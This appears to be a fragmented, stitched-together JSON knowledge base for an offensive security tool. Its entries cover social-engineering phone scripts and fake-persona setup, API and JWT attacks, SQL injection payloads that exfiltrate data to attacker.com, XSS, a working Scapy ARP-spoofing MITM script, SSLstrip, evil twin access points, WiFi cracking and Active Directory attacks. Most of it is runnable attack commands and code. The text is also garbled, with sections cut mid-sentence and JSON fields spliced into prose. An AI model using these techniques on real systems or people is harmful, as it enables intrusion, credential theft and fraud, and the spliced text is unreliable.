The more accurate and personalized a pretext, the higher the success rate.\n\n## Target Profiling Methodology\n\n```\n1. Identify target organization and individuals\n2. Map org structure (LinkedIn, company website, press releases)\n3. Enumerate email format, phone systems, technology stack\n4. Build individual profiles (roles, responsibilities, relationships)\n5. Identify trusted relationships and communication patterns\n6. Construct personalized pretext scenarios\n```\n\n---\n\n## LinkedIn Reconnaissance\n\nLinkedIn is the richest source of corporate intelligence:\n\n```bash\n# Manual enumeration:\n# site:linkedin.com/in \"Acme Corp\" \"IT Manager\"\n# site:linkedin.com/in \"Acme Corp\" \"Security\"\n\n# LinkedIn search operators (in search bar):\n# \"Acme Corp\" AND \"CISO\"\n# \"Acme Corp\" AND \"Active Directory\" AND \"Engineer\"\n\n# Tools:\n# linkedin2username: generate email wordlists from LinkedIn\ngit clone https://github.com/initstring/linkedin2username\npython3 linkedin2username.py -u your@email.com -c \"Acme Corp\"\n# Generates: firstname.lastname, f.lastname, flastname combos\n\n# CrossLinked: scrape LinkedIn without API\npip3 install crosslinked\ncrosslinked -f '{first}.{last}@acme.com' \"Acme Corp\"\n\n# InSpy: LinkedIn employee enumeration\npython3 inspy.py --empspy acme.com\n```\n\n**Intelligence from LinkedIn profiles:**\n- Job title and reporting structure → org chart reconstruction\n- Skills and endorsements → technology stack (Azure AD, CrowdStrike, ServiceNow)\n- Posts and activity → current projects, upcoming events, travel\n- Connections → who trusts whom, vendor relationships\n- Job postings → security gaps, new initiatives, budget\n\n---\n\n## Email Harvesting\n\n```bash\n# theHarvester: multi-source email/domain recon\ntheHarvester -d acme.com -b all -l 500 -f output.html\ntheHarvester -d acme.com -b google,bing,linkedin,hunter -l 200\n\n# Hunter.io (web): search domain → email format + verified addresses\n# API:\ncurl \"https://api.hunter.io/v2/domain-search?domain=acme.com&api_key=KEY\"\ncurl \"https://api.hunter.io/v2/email-finder?domain=acme.com&first_name=John&last_name=Smith&api_key=KEY\"\n\n# Phonebook.cz: It is the foundation of virtually every social engineering attack.\n\n## Building a Believable Persona\n\n### Identity Components\n\nA convincing persona requires consistency across every touchpoint:\n\n| Component | Details |\n|-----------|---------|\n| Full name | Common name matching claimed ethnicity/region |\n| Job title | Realistic for claimed company/role |\n| Email | Domain-matched (fake or compromised) |\n| Phone | VoIP with spoofed caller ID |\n| LinkedIn | Aged profile with connections, endorsements |\n| Physical props | ID badge, uniform, business cards, clipboard |\n| Backstory | Consistent answers to probing questions |\n| Mannerisms | Confident, unhurried, authoritative |\n\n### Fake LinkedIn Profile Setup\n\n```\n1. Create email account (Gmail/Outlook) unlinked to real identity\n2. Use AI-generated profile photo (thispersondoesnotexist.com)\n3. Add realistic work history (plausible companies, titles, dates)\n4. Connect with 50+ people (use industry-relevant connection requests)\n5. Age the profile 30–90 days before use\n6. Add certifications, skills relevant to pretext role\n7. Join relevant LinkedIn groups for authenticity\n```\n\n---\n\n## Cialdini's Principles in Practice\n\n### Authority\n\"Hi, this is Marcus from IT Security. We've detected unusual login activity on your account and need to verify your identity immediately.\"\n\n- Use titles: \"Director of IT\", \"Security Operations\", \"Compliance Officer\"\n- Reference power figures: \"The CISO asked me to follow up on this directly\"\n- Wear uniforms, carry clipboards, use technical jargon\n\n### Urgency\n\"Your VPN access will be terminated in 30 minutes unless we can verify your credentials. I need to help you right now.\"\n\n- Creates panic, bypasses rational analysis\n- \"Urgent\", \"immediately\", \"by end of day\", \"before the audit\"\n- Combine with authority: \"Legal is waiting on this\"\n\n### Social Proof\n\"We've already updated credentials for everyone else on your floor — you're the last one we need to reach.\"\n\n- \"Your manager already completed this\"\n- \"The rest of your team has already enrolled\"\n\n### Scarcity\n\"We only have 10 minutes before the maintenance window closes and your account will be locked.\"\n\n### Liking\nBuild rapport first — use target's name, reference shared context (their team, recent company news, local sports):\n\n```\n\"Hey Sarah! I saw you were at the all-hands last week — great session, right? \nI'm calling because we're rolling out the new SSO today and wanted to make \nsure your account was ready...\"\n```\n\n### Reciprocity\nProvide something of value first, then ask:\n\"I was able to push back your ticket deadline by a week — now I just need \nyour help confirming one thing to close out this security ticket...\"\n\n---\n\n## IT Helpdesk Pretext (Phone)\n\nThe most effective and commonly used pretext in corporate environments:\n\n**Setup:**\n```bash\n# VoIP spoofing (spoof IT helpdesk number)\n# Use SIPVicious or authorized VoIP provider with caller ID control\n# Target: employee identified via LinkedIn/company directory\n# Timing: Monday morning or Friday afternoon (high stress, rushed)\n```\n\n**Script Template:**\n```\n\"Hi [Target Name], this is [Fake Name] from IT Security. \nI'm calling because our monitoring system flagged some unusual authentication \nattempts on your account overnight — looks like someone may have tried to \naccess your email from an unknown location.\n\nI just need to verify a couple things to make sure your account is secure. \nFirst, can you confirm your employee ID so I can pull up your ticket? \n[Pause — let them answer]\n\nGreat. Attacks\n\nAttacking REST, GraphQL, WebSocket, and gRPC APIs — authentication bypass, authorization flaws, and injection.\n\n## API Discovery & Enumeration\n\n```bash\n# Common documentation endpoints\n/swagger.json /swagger/v1/swagger.json /api-docs /openapi.json\n/v2/api-docs /graphql /graphiql /.well-known/openapi.yaml\n/api/swagger /docs /redoc\n\n# Kiterunner (API-specific path discovery)\nkr scan https://target.com -w /path/to/routes-large.kite -x 20\n\n# ffuf for endpoint fuzzing\nffuf -u https://target.com/api/FUZZ -w /path/to/api-wordlist.txt -mc signature\njwt_tool TOKEN -X a\n# If accepted: forge any claims without a signing key\n```\n\n**Algorithm confusion (RS256 to HS256)**:\n```bash\n# Server verifies RS256 token but also accepts HS256\n# Sign with the public key (which is known) as HMAC secret\njwt_tool TOKEN -X k -pk public.pem\n```\n\n**Weak secret brute force**:\n```bash\nhashcat -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt\njwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt\n```\n\n**kid parameter injection**:\n```bash\n# kid: path traversal to /dev/null (empty key)\njwt_tool TOKEN -I -hc kid -hv \"../../dev/null\" -S hs256 -p \"\"\n\n# kid: SQL injection\njwt_tool TOKEN -I -hc kid -hv \"' UNION SELECT 'key123'--\" -S hs256 -p \"key123\"\n```\n\n**jku/x5u header injection**: Point to attacker-hosted JWK set or certificate.\n\n### API Key Disclosure\n\n```bash\n# Check JavaScript files\ngrep -rE 'api[_-]?key|apikey|api_secret' js_files/\n\n# GitHub search\n\"target.com\" sequential IDs\nGET /api/users/1001 → own data\nGET /api/users/1002 → other user's data?\n\n# UUID enumeration (leak via other endpoints)\nGET /api/users → list includes UUIDs of other users\nGET /api/users/UUID → direct object access\n\n# Parameter tampering\nGET /api/orders?user_id=victim_id\n\n# Replace ID in response\nPOST /api/transfer {\"from\": \"my_account\", \"to\": \"my_account\"}\n→ Change \"from\" to victim's account\n```\n\n### BFLA (Broken Function Level Authorization)\n\n```bash\n# Access admin endpoints as regular user\nGET /api/admin/users\nPOST /api/admin/users/create\nDELETE /api/users/1001\n\n# Method change\nGET /api/users/1001 → allowed\nPUT /api/users/1001 → should be denied but isn't?\n\n# Version/path manipulation\n/api/v1/users (enforced) → /api/v2/users (forgotten)\n/api/users → /api/Users (case sensitivity)\n```\n\n### Mass Assignment\n\n```bash\n# Add unexpected fields to requests\nPOST /api/register\n{\"username\": \"test\", \"password\": \"test\", \"role\": \"admin\"}\n{\"username\": \"test\", \"password\": \"test\", \"isAdmin\": true}\n{\"username\": \"test\", \"password\": \"test\", \"credits\": 99999}\n\n# 1.2.3.4\nX-Client-IP: 1.2.3.4\n\n# Parameter manipulation\n# Adding null bytes, whitespace, or encoding to make each request \"unique\"\nPOST /api/login {\"user\": \"admin\", \"pass\": \"test1\"}\nPOST /api/login {\"user\": \"admin \", \"pass\": \"test2\"} # trailing space\nPOST /api/login {\"user\": \"admin%00\", \"pass\": \"test3\"} # null byte\n\n# Distributed via proxy rotation\n```\n\n## GraphQL Attacks\n\n```graphql\n# Introspection query (discover schema)\n{\n __schema {\n types {\n name\n fields {\n name\n type { name }\n }\n }\n }\n}\n\n# Even if introspection is disabled, try field suggestion\n{ user { a } } # Error may suggest valid field names\n\n# Batching attacks (bypass rate limiting)\n[\n {\"query\": \"mutation { "2026-03-12"}, "sql-injection": {"slug": "sql-injection", "title": "SQL Injection Comprehensive", "category": "Web Attacks", "content": "# SQL Injection Comprehensive\n\nDetailed reference for SQL injection detection, exploitation, and filter bypass across all major database engines.\n\n## Detection Methods\n\n**Error-based**: Inject syntax errors to confirm SQL context:\n```\n' → SQL error in response = injectable\n'' → No error = string context confirmed\n' OR '1'='1 → True condition\n' OR '1'='2 → False condition (compare responses)\n```\n\n**Boolean-blind**: Infer data from response differences:\n```\n?id=1 AND 1=1 → normal response\n?id=1 AND 1=2 → different response (shorter, different content)\n```\n\n**Time-based blind**: Infer from response delay:\n```sql\n?id=1; WAITFOR DELAY '0:0:5'-- -- MSSQL\n?id=1 AND SLEEP(5)-- -- MySQL\n?id=1; SELECT pg_sleep(5)-- -- PostgreSQL\n?id=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -- Oracle\n```\n\n**Out-of-band**: Exfil data via DNS or HTTP when no in-band feedback:\n```sql\n-- MSSQL\n'; DECLARE @q VARCHAR(1024); SET @q='\\\\'+db_name()+'.attacker.com\\share'; EXEC master..xp_dirtree @q--\n-- Oracle\nSELECT UTL_HTTP.REQUEST('http://attacker.com/'||user) FROM dual\n```\n\n## Database-Specific Syntax\n\n### MySQL\n```sql\n-- Version: SELECT @@version\n-- Current DB: SELECT database()\n-- List DBs: SELECT schema_name FROM information_schema.schemata\n-- List tables: SELECT table_name FROM information_schema.tables WHERE table_schema='target_db'\n-- List columns: SELECT column_name FROM information_schema.columns WHERE table_name='users'\n-- String concat: CONCAT(a,b) or a||b (in newer versions)\n-- Comment: -- , #, /**/\n-- Stacked queries: supported with multi_query\n-- File read: LOAD_FILE('/etc/passwd')\n-- File write: SELECT '' INTO OUTFILE '/var/www/html/shell.php'\n```\n\n### MSSQL\n```sql\n-- Version: SELECT @@version\n-- Current DB: SELECT db_name()\n-- List DBs: SELECT name FROM master..sysdatabases\n-- List tables: SELECT name FROM sysobjects WHERE xtype='U'\n-- List columns: SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')\n-- Stacked queries: supported by default\n-- RCE via xp_cmdshell:\nEXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';\n-- Linked servers:\nSELECT * FROM OPENQUERY([linked_server], 'SELECT @@version')\nEXEC ('xp_cmdshell ''whoami''') AT [linked_server]\n```\n\n### PostgreSQL\n```sql\n-- Version: SELECT version()\n-- Current DB: SELECT current_database()\n-- List DBs: SELECT datname FROM pg_database\n-- List tables: SELECT tablename FROM pg_tables WHERE schemaname='public'\n-- Stacked queries: supported\n-- File read: SELECT pg_read_file('/etc/passwd')\n-- RCE: COPY cmd_output FROM PROGRAM 'id';\n-- Large object for binary exfil:\nSELECT lo_import('/etc/passwd');\nSELECT lo_get(LOID);\n```\n\n### Oracle\n```sql\n-- username,password,NULL,NULL FROM users--\n' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables--\n```\n\n## sqlmap Reference\n\n```bash\n# Basic\nsqlmap -u Requires victim to click crafted URL.\n\n**Stored**: Payload saved server-side and rendered to other users. Higher impact.\n\n**DOM-based**: Vulnerability in client-side JavaScript. Server never sees the payload.\n\n**Mutation XSS (mXSS)**: Exploit HTML parser vs sanitizer interpretation differences.\n\n## Context-Specific Payloads\n\n**HTML context**:\n```html\n\n\n\n\n\n\n\n\n```\n\nAdditional bypass techniques: double URL encoding, null byte injection, Unicode normalization (fullwidth characters), HTTP parameter pollution, chunked transfer encoding to split payloads.\n\n## DOM XSS Analysis\n\n**Dangerous sinks** in client-side code: DOM property assignment with HTML content, timer functions accepting string arguments, Function constructor, location assignment, and jQuery HTML methods.\n\n**Sources to trace**: location.hash, location.search, document.referrer, window.name, postMessage data, document.cookie.\n\nUse browser DevTools or tools like DOM Invader (Burp Suite) to trace data flow from sources to sinks.\n\n## Advanced Techniques\n\n**Dangling markup injection**: Leave tags unclosed to capture subsequent page content in attribute values.\n\n**XS-Leaks**: Infer cross-origin state through side channels (cache timing, frame counting, error events, CORB responses).\n\n**Prototype pollution chains**: Pollute Object.prototype with properties consumed by unsafe sinks when legitimate properties are undefined.\n\n**postMessage abuse**: Pages accepting postMessage without origin validation can be exploited from attacker-controlled frames.\n\n## Blind XSS\n\nPayload triggers in admin panels, support dashboards, or log viewers — contexts you cannot directly observe.\n\n**Injection points**: Support tickets, contact forms, User-Agent/Referer headers, profile fields, error reports, feedback forms.\n\n**Collection**: Use XSS Hunter, interact.sh, or self-hosted callback servers. Payloads should capture: URL, cookies, DOM content, screenshot.\n\n## Testing Methodology\n\n1. Map all input reflection points (parameters, headers, body fields)\n2. Identify rendering context (HTML, attribute, JS, URL)\n3. Test context-appropriate payloads\n4. If filtered: identify filter logic, attempt bypass\n5. This positions the attacker as a man-in-the-middle, intercepting all traffic between victims without breaking their connectivity.\n\n## ARP Protocol Mechanics\n\n```\nNormal ARP flow:\nHost A (192.168.1.100): \"Who has 192.168.1.1? Tell 192.168.1.100\"\nGateway (192.168.1.1): \"192.168.1.1 is at AA:BB:CC:DD:EE:FF\"\nHost A caches: 192.168.1.1 → AA:BB:CC:DD:EE:FF\n\nARP Spoof attack:\nAttacker sends to Host A: \"192.168.1.1 is at ATTACKER_MAC\" (gratuitous ARP reply)\nAttacker sends to Gateway: \"192.168.1.100 is at ATTACKER_MAC\"\nBoth sides now send traffic to ATTACKER_MAC → attacker forwards → invisible MITM\n```\n\nARP has no authentication — any host can send replies claiming any IP. `arp -n` or `ip neigh show` reveals the ARP cache; poisoned entries overwrite legitimate ones.\n\n---\n\n## Scapy ARP Spoofing\n\n```python\nfrom scapy.all import ARP, Ether, sendp, get_if_hwaddr, getmacbyip\nimport time, threading\n\ndef get_mac(ip):\n ans = ARP(pdst=ip)\n result = sr1(ans, timeout=2, verbose=0)\n return result[ARP].hwsrc if result else None\n\ndef spoof(target_ip, spoof_ip, target_mac):\n \"\"\"Send ARP reply: tell target_ip that spoof_ip is at our MAC\"\"\"\n pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac,\n psrc=spoof_ip, hwsrc=get_if_hwaddr(\"eth0\"))\n send(pkt, verbose=0)\n\ndef restore(dest_ip, src_ip, dest_mac, src_mac):\n \"\"\"Restore correct ARP mapping\"\"\"\n pkt = ARP(op=2, pdst=dest_ip, hwdst=dest_mac,\n psrc=src_ip, hwsrc=src_mac)\n send(pkt, count=4, verbose=0)\n\n# Main attack loop\nvictim_ip = \"192.168.1.100\"\ngateway_ip = \"192.168.1.1\"\nvictim_mac = get_mac(victim_ip)\ngateway_mac = get_mac(gateway_ip)\n\nprint(f\"[*] Victim: {victim_ip} ({victim_mac})\")\nprint(f\"[*] Gateway: {gateway_ip} ({gateway_mac})\")\n\ntry:\n while True:\n spoof(victim_ip, gateway_ip, victim_mac) # tell victim: gateway is us\n spoof(gateway_ip, victim_ip, gateway_mac) # tell gateway: victim is us\n time.sleep(2)\nexcept KeyboardInterrupt:\n print(\"[*] Restoring ARP tables...\")\n restore(victim_ip, gateway_ip, victim_mac, gateway_mac)\n restore(gateway_ip, victim_ip, gateway_mac, victim_mac)\n```\n\n**Forwarding traffic (must enable IP forwarding):**\n```bash\necho 1 > /proc/sys/net/ipv4/ip_forward\n# Without this, traffic is dropped instead of forwarded — DoS instead of MITM\n```\n\n---\n\n## arpspoof (dsniff suite)\n\n```bash\nsudo apt install dsniff -y\n\n# Terminal 1: poison victim's gateway entry\nsudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1\n\n# Terminal 2: poison gateway's victim entry (bidirectional)\nsudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100\n\n# Enable forwarding\necho 1 | sudo tee /proc/sys/net/ipv4/ip_forward\n```\n\n---\n\n## Bettercap (Modern All-in-One MITM)\n\nBettercap is the most capable MITM framework — handles ARP, DNS, HTTP/HTTPS interception, credential sniffing, and custom scripting:\n\n```bash\n# Install\nsudo apt install bettercap -y\n# Or build from source:\ngo install github.com/bettercap/bettercap@latest\n\n# Launch\nsudo bettercap -iface eth0\n\n# In Bettercap console:\n# Discover network\nnet.probe on # probe to populate ARP cache\nnet.show # list discovered hosts\n\n# ARP spoofing\nset arp.spoof.targets 192.168.1.100 # specific target (comma-separated for multiple)\nset arp.spoof.fullduplex true # poison both directions\narp.spoof on\n\n# DNS spoofing (redirect queries)\nset dns.spoof.domains *.microsoft.com,*.okta.com\nset dns.spoof.address 192.168.1.50 # extracts HTTP basic auth, FTP, SMTP, POP3 cleartext creds\n```\n\n### Bettercap Caplets (Scripts)\n\n```bash\n# Run a caplet (scripted attack)\nsudo bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/http-req-dump.cap\n\n# Custom caplet: arp.cap\n# /etc/bettercap/arp-mitm.cap:\nnet.probe on\nwait 5s\nset arp.spoof.fullduplex true\nset arp.spoof.targets 192.168.1.0/24\narp.spoof on\nnet.sniff on\n\nsudo bettercap -iface eth0 -caplet /etc/bettercap/arp-mitm.cap\n```\n\n---\n\n## SSLstrip and HSTS Bypass\n\nSSLstrip downgrades HTTPS to HTTP by intercepting redirects and rewriting links:\n\n```bash\n# Classic SSLstrip\npip install sslstrip\nsudo python3 sslstrip.py -l 8080 -w /tmp/sslstrip.log\n\n# iptables redirect HTTP traffic to sslstrip\nsudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080\n\n# Combined with ARP spoof:\n# 1. hosts\narp.spoof on # without set arp.spoof.targets → all hosts\n\n# Scapy: iterate subnet\nfrom scapy.all import *\nimport ipaddress\n\nsubnet = ipaddress.ip_network(\"192.168.1.0/24\", "category": "WiFi & Network", "content": "# Evil Twin Attacks\n\nAn evil twin is a rogue access point broadcasting the same SSID as a legitimate target AP. Clients that connect (via deauth of the real AP or stronger signal) have their traffic routed through the attacker — enabling credential capture, MITM, and malware delivery.\n\n## Attack Variants\n\n| Variant | Method | Best For |\n|---------|--------|----------|\n| **Classic Evil Twin** | Same SSID, stronger signal, open or matching encryption | Deauthentication → reconnect to attacker AP |\n| **Captive Portal Twin** | Open evil twin, portal captures credentials | Corporate/hotel WiFi that uses portal auth |\n| **KARMA Attack** | Respond to all probe requests with matching SSID | Devices auto-connecting to \"remembered\" networks |\n| **Known Networks** | Broadcast common SSIDs (WiFi, xfinitywifi, etc.) | High-volume targeting of home user devices |\n| **Enterprise Twin** | WPA2-Enterprise with rogue RADIUS capturing MSCHAPv2 | Corporate AD credential harvesting |\n\n---\n\n## Prerequisites\n\n```bash\n# Two adapters recommended:\n# wlan0 → internet uplink (NAT to provide internet to victims)\n# wlan1 → evil twin AP (monitor/AP mode)\n\n# Verify AP mode support\niw phy phy0 info | grep -A 10 \"Supported interface modes\" | grep AP\n# Must show \"* AP\"\n\n# Install required tools\nsudo apt install hostapd dnsmasq iptables-persistent apache2 -y\n```\n\n---\n\n## Method 1: hostapd + dnsmasq (Manual)\n\n### AP Configuration (hostapd)\n\n```bash\ncat > /tmp/evil_twin.conf << 'EOF'\ninterface=wlan1\ndriver=nl80211\nssid=TargetCorporateSSID\nhw_mode=g\nchannel=6\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=0\n# For WPA2 PSK twin (if you know the target password):\n# wpa=2\n# wpa_passphrase=KnownPassword\n# wpa_key_mgmt=WPA-PSK\n# wpa_pairwise=CCMP\nEOF\n\nsudo hostapd /tmp/evil_twin.conf &\n```\n\n### DHCP + DNS (dnsmasq)\n\n```bash\n# Assign static IP to AP interface\nsudo ip addr add 192.168.69.1/24 dev wlan1\nsudo ip link set wlan1 up\n\ncat > /tmp/evil_dnsmasq.conf << 'EOF'\ninterface=wlan1\ndhcp-range=192.168.69.10,192.168.69.200,12h\ndhcp-option=3,192.168.69.1 # Default gateway\ndhcp-option=6,192.168.69.1 # DNS server\n# Captive portal: resolve all domains to attacker IP\naddress=/#/192.168.69.1\nEOF\n\nsudo dnsmasq -C /tmp/evil_dnsmasq.conf --no-daemon &\n```\n\n### Internet Sharing (NAT)\n\n```bash\n# Enable IP forwarding\necho 1 | sudo tee /proc/sys/net/ipv4/ip_forward\n\n# NAT: route victim traffic through wlan0 (uplink)\nsudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE\nsudo iptables -A FORWARD -i wlan1 -o wlan0 -j ACCEPT\nsudo iptables -A FORWARD -i wlan0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT\n\n# Redirect all HTTP to captive portal\nsudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j DNAT --to-destination 192.168.69.1:80\n# Optionally redirect HTTPS (breaks valid TLS — obvious but useful for credential capture)\nsudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 Reconnaissance", "category": "WiFi & Network", "content": "# WiFi Reconnaissance\n\nWireless reconnaissance maps the RF environment of a target — discovering access points, associated clients, hidden SSIDs, encryption types, and vendor information — prior to active attacks. Effective WiFi recon requires the adapter in monitor mode and often physical proximity.\n\n## Monitor Mode Setup\n\nMonitor mode allows passive capture of all 802.11 frames in range, regardless of BSSID.\n\n```bash\n# Method 1: iw (modern, preferred)\nsudo ip link set wlan0 down\nsudo iw dev wlan0 set type monitor\nsudo ip link set wlan0 up\niw dev wlan0 info # verify: type monitor\n\n# Method 2: airmon-ng (kills interfering processes first)\nsudo airmon-ng check kill # kills NetworkManager, wpa_supplicant\nsudo airmon-ng start wlan0 # creates wlan0mon interface\n\n# Method 3: iwconfig (legacy)\nsudo ifconfig wlan0 down\nsudo iwconfig wlan0 mode Monitor\nsudo ifconfig wlan0 up\n\n# Restore managed mode\nsudo airmon-ng stop wlan0mon\n# or:\nsudo ip link set wlan0 down\nsudo iw dev wlan0 set type managed\nsudo ip link set wlan0 up\nsudo systemctl restart NetworkManager\n```\n\n### Adapter Recommendations\n| Adapter | Chipset | Monitor | Injection | Notes |\n|---------|---------|---------|-----------|-------|\n| Alfa AWUS036ACH | RTL8812AU | Yes | Yes | Best for 5GHz |\n| Alfa AWUS036NHA | AR9271 | Yes | Yes | Best 2.4GHz support |\n| Alfa AWUS036ACM | MT7612U | Yes | Yes | Dual-band, reliable |\n| Panda PAU09 | RT5572 | Yes | Yes | Budget dual-band |\n| Built-in Intel | Various | Limited | No | Generally avoid |\n\n---\n\n## Passive AP Discovery\n\n### airodump-ng\n\nThe standard tool for 802.11 reconnaissance:\n\n```bash\n# Scan all channels (2.4GHz)\nsudo airodump-ng wlan0mon\n\n# Output fields: BSSID, PWR (dBm), Beacons, Data, CH, MB, ENC, CIPHER, AUTH, ESSID\n# Associated clients shown in lower section: BSSID, STATION, PWR, Rate, Lost, Frames, Probe\n\n# Scan specific band\nsudo airodump-ng --band a wlan0mon # 5GHz only\nsudo airodump-ng --band abg wlan0mon # both\n\n# Target specific AP (lock channel, write pcap)\nsudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/capture wlan0mon\n\n# Filter by encryption type\nsudo airodump-ng --encrypt WPA2 wlan0mon\n\n# CSV/JSON output for parsing\nsudo airodump-ng -w /tmp/scan --output-format csv,json wlan0mon\n# Generates: /tmp/scan-01.csv, /tmp/scan-01.kismet.netxml\n```\n\n**Reading airodump output:**\n- `PWR`: signal strength; -30 = very close, -80 = edge of range\n- `ENC`: OPN (open), WEP, WPA, WPA2, WPA3\n- `CIPHER`: TKIP (WPA1, weaker), CCMP (WPA2/3, AES)\n- `AUTH`: PSK (pre-shared key, crack offline), MGT (Enterprise/802.1X — no offline crack)\n- `ESSID `: hidden SSID (ESSID blank but length shown — can probe to reveal)\n\n### Kismet\n\nKismet is the most advanced wireless IDS/passive scanner:\n\n```bash\n# Install\nsudo apt install kismet -y\n\n# Run (web UI on http://localhost:2501)\nsudo kismet -c wlan0mon\n\n# Command line: log to SQLite for analysis\nkismet -c wlan0mon --log-title \"site_survey\" --log-type kismet\n\n# Query captured data\nsqlite3 site_survey.kismet \"SELECT devmac, ssid, signal_last, channel FROM devices WHERE type='Wi-Fi AP';\"\n\n# Export to CSV\nkismet_db_to_pcap site_survey.kismet -o capture.pcap\n```\n\nKismet advantages over airodump: channel-hop across both bands simultaneously, maintains device history, detects rogue APs, exports to KML for geolocation mapping.\n\n### iw (Lightweight, No Root for Scan)\n\n```bash\n# Quick scan without monitor mode (uses managed mode)\nsudo iw dev wlan0 scan | grep -E \"SSID:|signal:|freq:|capability:\"\n\n# Parsed output\nsudo iw dev wlan0 scan | awk '/BSS /{bss=$2} /SSID:/{print bss, $2} /signal:/{print $2}' \n\n# Check connected AP details\niw dev wlan0 link\niw dev wlan0 station dump\n```\n\n### nmcli / NetworkManager\n\n```bash\n# List visible APs (no monitor mode required)\nnmcli dev wifi list\nnmcli dev wifi list --rescan yes # force rescan\n# Output: SSID, BSSID, MODE, CHAN, RATE, SIGNAL, BARS, SECURITY\n\n# Detailed\nnmcli -f ALL dev wifi list\n```\n\n---\n\n## Hidden SSID Detection\n\nAPs configured with \"hidden SSID\" suppress the SSID in beacon frames but still respond to Probe Requests:\n\n```bash\n# airodump shows hidden SSIDs as \n# Technique 1: Wait for client to probe (passive) — clients broadcast SSID in probe requests\nsudo airodump-ng wlan0mon # watch PROBED column\n\n# Technique 2: Active probe (deauth client, watch reconnect probe)\nsudo aireplay-ng --deauth 1 -a BSSID -c CLIENT_MAC wlan0mon\n# Client reconnects → broadcasts SSID in probe request → airodump reveals it\n\n# Technique 3: Brute-force probe (active)\nmdk4 wlan0mon p -t BSSID # sends probe requests\n\n# Technique 4: 802.11 probe request injection\npython3 -c \"\nfrom scapy.all import *\npkt = RadioTap()/Dot11(type=0,subtype=4,addr1='ff:ff:ff:ff:ff:ff',addr2=RandMAC(),addr3='ff:ff:ff:ff:ff:ff')/Dot11ProbeReq()/Dot11Elt(ID='SSID',info='')\nsendp(pkt, iface='wlan0mon', count=10)\n\"\n```\n\n---\n\n## Client Enumeration and Probing\n\nAssociated clients reveal target's device inventory and their home network names:\n\n```bash\n# airodump: lower pane shows associated clients\n# Columns: BSSID (AP), STATION (client MAC), PWR, Rate, Lost, Frames, Probe(s)\n\n# Extract client → AP associations from pcap\ntshark -r capture.pcap -Y \"wlan.fc.type_subtype == 0x08\" \\\n -T fields -e wlan.bssid -e wlan.sa -e wlan.ssid\n\n# Client probe requests (SSIDs they're searching for — home networks, corporate, etc.)\ntshark -r capture.pcap -Y \"wlan.fc.type_subtype == 0x04\" \\\n -T fields -e wlan.sa -e wlan_mgt.ssid\n```\n\n**Intelligence from probes:**\n- Clients probing for `CorpNet_WiFi` → work laptops, corporate target network name\n- Clients probing for home SSIDs → personal devices, home network intelligence\n- Vendor OUI (first 3 bytes of MAC) → device type (00:50:F2 = Microsoft, 00:17:F2 = Apple, etc.)\n\n```bash\n# OUI lookup\ncurl \"https://api.macvendors.com/AA:BB:CC\" 2>/dev/null\n# Or use local database\ngrep \"AA:BB:CC\" /usr/share/ieee-data/oui.txt\n```\n\n---\n\n## Signal Mapping and Site Survey\n\n### Wardriving\n\n```bash\n# gpsd for GPS integration\nsudo apt install gpsd gpsd-clients\nsudo gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock\ncgps # generate rouge AP cert\neaphammer -i wlan0mon --channel 6 --auth wpa-eap --essid CorpSSID \\\n --creds # downgrade to EAP-MD5, capture credentials\n```\n\n---\n\n## PMKID Attack (Clientless WPA2 Capture)\n\nPMKID is derived from the PMK (pairwise master key = PBKDF2(PSK, SSID)) and can be obtained from a single EAPOL frame from the AP — no client needed:\n\n```bash\n# Step 1: Capture PMKID\nsudo hcxdumptool -i wlan0mon -o /tmp/pmkid.pcapng \\\n --enable_status=1 --active_beacon --disable_deauthentication\n\n# Step 2: Extract PMKID hash for hashcat\nsudo hcxpcapngtool -o /tmp/pmkid.hc22000 /tmp/pmkid.pcapng\n\n# Step 3: Crack with hashcat\nhashcat -m 22000 /tmp/pmkid.hc22000 /usr/share/wordlists/rockyou.txt\nhashcat -m 22000 /tmp/pmkid.hc22000 -a 3 \"?l?l?l?l?l?l?l?l\" # brute force 8-char\n\n# For targeted capture of specific AP\nsudo hcxdumptool -i wlan0mon --filterlist_ap=TARGET_BSSID \\\n --filtermode=2 -o /tmp/target.pcapng\n```\n\n---\n\n## Vantablack WiFi Recon API\n\n```bash\n# Trigger scan (requires adapter in monitor mode on agent host)\ncurl -X GET /api/wifi/scan -H \"X-API-Token: $TOKEN\"\n# Returns: [{ssid, bssid, channel, signal_dbm, encryption, vendor}, ...]\n\n# Get associated clients\ncurl /api/wifi/clients/AA:BB:CC:DD:EE:FF -H \"X-API-Token: $TOKEN\"\n\n# Agent-side wifi_scan module\necho '{\"action\":\"scan\",\"interface\":\"wlan0mon\"}' | \\\n curl -X POST /api/agents/AGENT_ID/task ...\n```", "last_updated": "2026-03-15"}, "active-directory-attacks": {"slug": "active-directory-attacks", "title": "Active Directory Attack Paths", "category": "Windows Privesc", "content": "# Active Directory Attack Paths\n\nComprehensive coverage of AD attack techniques from initial domain user to Domain Admin and beyond.\n\n## BloodHound / Attack Path Mapping\n\n```bash\n# SharpHound collection (from Windows)\nSharpHound.exe --CollectionMethods All --Domain target.local\n\n# BloodHound.py (from Linux — stealthier, no binary on target)\nbloodhound-python -u user -p password -d target.local -dc dc01.target.local -c all\n\n# Import JSON/ZIP into BloodHound CE or legacy Neo4j\n```\n\nKey queries: Shortest Path to Domain Admins, Find All Domain Admins, Shortest Paths from Owned Principals, Find Kerberoastable Users with Path to DA, Unconstrained Delegation Computers.\n\n## Kerberoasting\n\nRequest TGS tickets for service accounts, crack offline:\n\n```bash\n# Impacket\nGetUserSPNs.py 